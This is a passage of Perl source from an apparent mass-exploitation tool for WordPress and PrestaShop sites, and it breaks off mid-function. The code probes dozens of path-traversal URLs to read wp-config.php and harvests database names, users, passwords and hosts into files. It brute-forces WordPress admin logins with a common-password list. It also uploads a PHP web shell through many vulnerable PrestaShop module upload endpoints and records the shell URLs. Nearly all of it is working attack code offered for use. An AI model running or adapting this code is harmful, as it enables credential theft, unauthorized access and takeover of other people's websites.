@patik=('/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php','/wp-e-commerce/wpsc-includes/misc.functions.php?image_name=../../wp-config.php','/wp-content/plugins/wp-source-control/downloadfiles/download.php?path=../../../../wp-config.php','/wp-content/plugins/paypal-currency-converter-basic-for-woocommerce/proxy.php?requrl=../../../../wp-config.php','/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php','/wp-content/plugins/thecartpress/modules/Miranda.class.php?page=../../../../../../../../wp-config.php%00','/wp-content/themes/twentyeleven/download.php?file=%2Fwp-config.php','/wp-content/themes/twentyeleven/download.php?file=../../../wp-config.php','/wp-content/themes/twentyeleven/download.php?filename=../../../../../wp-config.php','/?action=cpis_init&cpis-action=f-download&purchase_id=1&cpis_user_email=i0SECLAB@intermal.com&f=../../../../wp-config.php','/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php','/wp-content/plugins/cip4-folder-download-widget/cip4-download.php?target=wp-config.php&info=wp-config.php','/wp-content/plugins//hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10','/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?path=../../../../../../../wp-config.php','/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php','/wp-content/themes/liberator/inc/php/download.php?download_file=../wp-config.php','/wp-content/themes/kap/download.php?url=..%2Fwp-config.php','/wp-content/themes/duena/download.php?f=../wp-config.php','/wp-content/themes/endlesshorizon/download.php?file=../../../wp-config.php','/wp-content/plugins/photocart-link/decode.php?id=Li4vLi4vLi4vd3AtY29uZmlnLnBocA==','/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php','/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10','$site/wp-content/plugins/sf-booking/lib/downloads.php?file=$site/wp-config.php','/wp-content/plugins/sf-booking/lib/downloads.php?file=/wp-config.php','/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php','/wp-admin/admin-ajax.php?action=revolution-slider_show_image&img=../wp-config.php','/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php','/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php','/wp-content/themes/estrutura-basica/scripts/download.php?arquivo=../../wp-config.php','/wp-content/plugins/contus-video-gallery/hdflvplayer/download.php?f=../../../../wp-config.php','/wp-config.php.bak','wp-config.php~','wp-config.php_bak','/wp-config.php-bak');
foreach $pmak(@patik){
chomp $pmak;
 
$url = "$site/$pmak";
$req = HTTP::Request->new(GET=>$url);
$userAgent = LWP::UserAgent->new();
$response = $userAgent->request($req);
$ar = $response->content;
if($ar =~ m/DB_NAME/g){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Wp LFD Bugs";
print color('bold white')," ----- Exploit ==>. ";
print color('bold green'),"OK\n";
print color('reset');
    open(save, '>>Result/Com_User.txt');   
    print save "[wplfd] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $url ));
$cont = $resp->content;
while($cont =~ m/DB_NAME/g){
        if ($cont =~ /DB_NAME\', \'(.*)\'\)/){
        print color("red"),"\t[-]Database Name = $1 \n";
print color 'reset';
$db=$1;
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[ DATABASE ] \n$site\n[-]Database Name = $1";
        close (TEXT);
        }
        if ($cont =~ /DB_USER\', \'(.*)\'\)/){
        print color("white"),"\t[-]Database User = $1 \n";
print color 'reset';
$user=$1;
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[-]Database User = $1";
        close (TEXT)
        }
        if ($cont =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print color("red"),"\t[-]Database Password = $1 \n";
print color 'reset';
$pass=$1;
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\nDatabase Password = $1";
        close (TEXT)
        }
        if ($cont =~ /DB_HOST\', \'(.*)\'\)/){
        print color("white"),"\t[-]Database Host = $1 \n\n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[-]Database Host = $1";
        close (TEXT)
}}
###		$input =$site;
###
###		if ($input =~ m/https:\/\//)
###		{
###			$source = substr($input,8,length($input));
##                        $driver = inet_ntoa(inet_aton($source));
##		}
##                elsif ($input =~ m/http:\/\//)
##                {
##                        $source = substr($input,7,length($input));
##                        print "Site : $source\n";
##                        $driver = inet_ntoa(inet_aton($source));
##
##                }
##		else 
##		{
##			$driver = inet_ntoa(inet_aton($input));
##		}
##system( "mysql -h $driver -u $user -p $pass");
###}
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"LFD & Config";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}
}
sub wpbrute{

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Start brute force";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"WAiTiNG\n";
$user = $site . '/?author=1';

$getuser = $ua->get($user)->content;
if($getuser =~/author\/(.*?)\//){
$wpuser=$1;
print "[+] Username: $wpuser\n";
wpc();
}
else {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Can't Get Username";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
wpcc();
}
}
sub wpc{
@patsw=('123456','admin123','123','123321','1234','admin','demo','12345','112233','Admin','password','root','baglisse');
foreach $pmasw(@patsw){
chomp $pmasw;

$wpz = $site . '/wp-login.php';
$redirect = $site . '/wp-admin/';
$wpass = $pmasw;
print "[-] Trying: $wpass \n";
$wpbrute = POST $wpz, [log => $wpuser, pwd => $wpass, wp-submit => 'Log In', redirect_to => $redirect];
$response = $ua->request($wpbrute);
my $stat = $response->as_string;

if($stat =~ /Location:/){
if($stat =~ /wordpress_logged_in/){

print "- ";
print color('bold green'),"FOUND\n";
open (TEXT, '>>Result/wppasscracked.txt');
print TEXT "$wpz ==> User: $wpuser Pass: $wpass\n";
close (TEXT);
print color('reset');

next OUTER;
}
}
}
}

sub wpcc{
@patsww=('123456','admin123','123','1234','admin','demo','12345','112233','Admin','password','root','baglisse');
foreach $pmasww(@patsww){
chomp $pmasww;
$wpzz = $site . '/wp-login.php';
$redirect = $site . '/wp-admin/';
$wpuser = "admin";
$wpass = $pmasww;
print "[-] Trying: $wpass \n";
$wpbrute = POST $wpzz, [log => $wpuser, pwd => $wpass, wp-submit => 'Log In', redirect_to => $redirect];
$response = $ua->request($wpbrute);
my $stat = $response->as_string;

if($stat =~ /Location:/){
if($stat =~ /wordpress_logged_in/){

print "- ";
print color('bold green'),"FOUND\n";
open (TEXT, '>>Result/wppasscracked.txt');
print TEXT "$wpzz ==> User: $wpuser Pass: $wpass\n";
close (TEXT);
print color('reset');

next OUTER;
}
}
}
}


######################################################
#################### PrestaShoP ######################
######################################################

################ columnadverts #####################
sub columnadverts(){
my $url = "$site/modules/columnadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["files/Izanami.php"],]);

$columnadvertsup="$site/modules/columnadverts/slides/Izanami.php?I=Xploit";

my $checkcolumnadverts = $ua->get("$columnadvertsup")->content;
if($checkcolumnadverts =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"columnadverts";
print color('bold white')," ----- Exploit ==>. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $columnadvertsup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$columnadvertsup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"columnadverts";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";
}
}


################ soopamobile #####################
sub soopamobile(){
my $url = "$site/modules/soopamobile/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["files/Izanami.php"],]);

$soopamobileup="$site/modules/soopamobile/slides/Izanami.php?I=Xploit";

my $checksoopamobile = $ua->get("$soopamobileup")->content;
if($checksoopamobile =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"soopamobile";
print color('bold white')," ----- Exploit ==>. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $soopamobileup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$soopamobileup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"soopamobile";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";
}
}

################ soopabanners #####################
sub soopabanners(){
my $url = "$site/modules/soopabanners/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["files/Izanami.php"],]);

$soopabannersup="$site/modules/soopabanners/slides/Izanami.php?I=Xploit";

my $checksoopabanners = $ua->get("$soopabannersup")->content;
if($checksoopabanners =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"soopabanners";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $soopabannersup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$soopabannersup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"soopabanners";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ vtermslideshow #####################
sub vtermslideshow(){
my $url = "$site/modules/vtermslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["files/Izanami.php"],]);

$vtermslideshowup="$site/modules/vtermslideshow/slides/Izanami.php?I=Xploit";

my $checkvtermslideshow = $ua->get("$vtermslideshowup")->content;
if($checkvtermslideshow =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Vtermslideshow";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $vtermslideshowup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$vtermslideshowup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Vtermslideshow";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ simpleslideshow #####################
sub simpleslideshow(){
my $url = "$site/modules/simpleslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["files/Izanami.php"],]);

$simpleslideshowup="$site/modules/simpleslideshow/slides/Izanami.php?I=Xploit";

my $checksimpleslideshow = $ua->get("$simpleslideshowup")->content;
if($checksimpleslideshow =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"simpleslideshow";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $simpleslideshowup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$simpleslideshowup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"simpleslideshow";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ productpageadverts #####################
sub productpageadverts(){
my $url = "$site/modules/productpageadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["files/Izanami.php"],]);

$productpageadvertsup="$site/modules/productpageadverts/slides/Izanami.php?I=Xploit";

my $checkproductpageadverts = $ua->get("$productpageadvertsup")->content;
if($checkproductpageadverts =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"productpageadverts";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $productpageadvertsup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$productpageadvertsup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"productpageadverts";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ homepageadvertise #####################
sub homepageadvertise(){
my $url = "$site/modules/homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["files/Izanami.php"],]);

$homepageadvertiseup="$site/modules/homepageadvertise/slides/Izanami.php?I=Xploit";

my $checkhomepageadvertise = $ua->get("$homepageadvertiseup")->content;
if($checkhomepageadvertise =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"homepageadvertise";
print color('bold white')," ----- Exploit ==>. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $homepageadvertiseup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$homepageadvertiseup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"homepageadvertise";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";
}
}

################ homepageadvertise2 #####################
sub homepageadvertise2(){
my $url = "$site/modules/homepageadvertise2/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["files/Izanami.php"],]);

$homepageadvertise2up="$site/modules/homepageadvertise2/slides/Izanami.php?I=Xploit";

my $checkhomepageadvertise2 = $ua->get("$homepageadvertise2up")->content;
if($checkhomepageadvertise2 =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"homepageadvertise2";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $homepageadvertise2up\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$homepageadvertise2up\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"homepageadvertise2";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ jro_homepageadvertise #####################
sub jro_homepageadvertise(){
my $url = "$site/modules/jro_homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["files/Izanami.php"],]);

$jro_homepageadvertiseup="$site/modules/jro_homepageadvertise/slides/Izanami.php?I=Xploit";

my $checkjro_homepageadvertise = $ua->get("$jro_homepageadvertiseup")->content;
if($checkjro_homepageadvertise =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"jro_homepageadvertise";
print color('bold white')," ............. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $jro_homepageadvertiseup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$jro_homepageadvertiseup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"jro_homepageadvertise";
print color('bold white')," ............. ";
print color('bold red'),"FAILED\n";
}
}

################ attributewizardpro #####################
sub attributewizardpro(){
my $url = "$site/modules/attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["files/Izanami.php"],]);

$attributewizardproup="$site/modules/attributewizardpro/file_uploads/Izanami.php?I=Xploit";

my $checkattributewizardpro = $ua->get("$attributewizardproup")->content;
if($checkattributewizardpro =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"attributewizardpro";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $attributewizardproup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$attributewizardproup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"attributewizardpro";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ 1attributewizardpro #####################
sub oneattributewizardpro(){
my $url = "$site/modules/1attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["files/Izanami.php"],]);

$oneattributewizardproup="$site/modules/1attributewizardpro/file_uploads/Izanami.php?I=Xploit";

my $checkoneattributewizardpro = $ua->get("$oneattributewizardproup")->content;
if($checkoneattributewizardpro =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"1attributewizardpro";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $oneattributewizardproup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$oneattributewizardproup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"1attributewizardpro";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ attributewizardpro.OLD #####################
sub attributewizardproOLD(){
my $url = "$site/modules/attributewizardpro.OLD/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["files/Izanami.php"],]);

$attributewizardproOLDup="$site/modules/attributewizardpro.OLD/file_uploads/Izanami.php?I=Xploit";

my $checkattributewizardproOLD = $ua->get("$attributewizardproOLDup")->content;
if($checkattributewizardproOLD =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Attributewizardpro.OLD";
print color('bold white')," ............ ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $attributewizardproOLDup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$attributewizardproOLDup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Attributewizardpro.OLD";
print color('bold white')," ............ ";
print color('bold red'),"FAILED\n";
}
}


################ attributewizardpro_x #####################
sub attributewizardpro_x(){
my $url = "$site/modules/attributewizardpro_x/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["files/Izanami.php"],]);

$attributewizardpro_xup="$site/modules/attributewizardpro_x/file_uploads/Izanami.php?I=Xploit";

my $checkattributewizardpro_x = $ua->get("$attributewizardpro_xup")->content;
if($checkattributewizardpro_x =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"attributewizardpro_x";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $attributewizardpro_xup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$attributewizardpro_xup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"attributewizardpro_x";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ advancedslider #####################
sub advancedslider(){
my $url = "$site/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["files/Izanami.php.png"],]);

$advancedsliderup="$site/modules/advancedslider/uploads/Izanami.php.png?I=Xploit";

my $checkadvancedslider = $ua->get("$advancedsliderup")->content;
if($checkadvancedslider =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"advancedslider";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $advancedsliderup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$advancedsliderup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"advancedslider";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ cartabandonmentpro #####################
sub cartabandonmentpro(){
my $url = "$site/modules/cartabandonmentpro/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["files/Izanami.php.png"],]);

$cartabandonmentproup="$site/modules/cartabandonmentpro/uploads/Izanami.php.png?I=Xploit";

my $checkcartabandonmentpro = $ua->get("$cartabandonmentproup")->content;
if($checkcartabandonmentpro =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"cartabandonmentpro";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $cartabandonmentproup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$cartabandonmentproup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"cartabandonmentpro";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ cartabandonmentproOld #####################
sub cartabandonmentproOld(){
my $url = "$site/modules/cartabandonmentproOld/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["files/Izanami.php.png"],]);

$cartabandonmentproOldup="$site/modules/cartabandonmentproOld/uploads/Izanami.php.png?I=Xploit";

my $checkcartabandonmentproOld = $ua->get("$cartabandonmentproOldup")->content;
if($checkcartabandonmentproOld =~/Izanami Xploit/) {
  
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"cartabandonmentproOld";
print color('bold white')," ............. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $cartabandonmentproOldup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$cartabandonmentproOldup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"cartabandonmentproOld";
print color('bold white')," ............. ";
print color('bold red'),"FAILED\n";
}
}

################ videostab #####################
sub videostab(){
my $url = "$site/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["files/Izanami.php.mp4"],]);

$videostabup="$site/modules/videostab/uploads/Izanami.php.mp4?I=Xploit";

my $checkvideostab = $ua->get("$videostabup")->content;
if($checkvideostab =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"videostab";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $videostabup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$videostabup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"videostab";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ wg24themeadministration #####################
sub wg24themeadministration(){
my $url = "$site/modules//wg24themeadministration/wg24_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'pattern_upload', Content => [bajatax => ["files/Izanami.php"],]);

$wg24themeadministrationup="$site/modules//wg24themeadministration///img/upload/Izanami.php?I=Xploit";

my $checkwg24themeadministration = $ua->get("$wg24themeadministrationup")->content;
if($checkwg24themeadministration =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"wg24themeadministration";
print color('bold white')," ........... ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $wg24themeadministrationup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$wg24themeadministrationup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"wg24themeadministration";
print color('bold white')," ........... ";
print color('bold red'),"FAILED\n";
}
}

################ fieldvmegamenu #####################
sub fieldvmegamenu(){
my $url = "$site/modules/fieldvmegamenu/ajax/upload.php";
my $shell ="files/Izanami.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$fieldvmegamenuup="$site/modules/fieldvmegamenu/uploads/Izanami.php?I=Xploit";

my $checkfieldvmegamenu = $ua->get("$fieldvmegamenuup")->content;
if($checkfieldvmegamenu =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"fieldvmegamenu";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $fieldvmegamenuup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$fieldvmegamenuup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"fieldvmegamenu";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}


################ wdoptionpanel #####################
sub wdoptionpanel(){
my $url = "$site/modules/wdoptionpanel/wdoptionpanel_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'image_upload', Content => [bajatax => ["files/Izanami.php"],]);

$wdoptionpanelup="$site/modules/wdoptionpanel/upload/Izanami.php?I=Xploit";

my $checkwdoptionpanel = $ua->get("$wdoptionpanelup")->content;
if($checkwdoptionpanel =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"wdoptionpanel";
print color('bold white')," ----- Exploit ==>. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $wdoptionpanelup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$wdoptionpanelup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"wdoptionpanel";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";
}
}


################ pk_flexmenu #####################
sub pk_flexmenu(){
my $url = "$site/modules/pk_flexmenu/ajax/upload.php";
my $shell ="files/Izanami.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_flexmenuup="$site/modules/pk_flexmenu/uploads/Izanami.php?I=Xploit";

my $checkpk_flexmenu = $ua->get("$pk_flexmenuup")->content;
if($checkpk_flexmenu =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"pk_flexmenu";
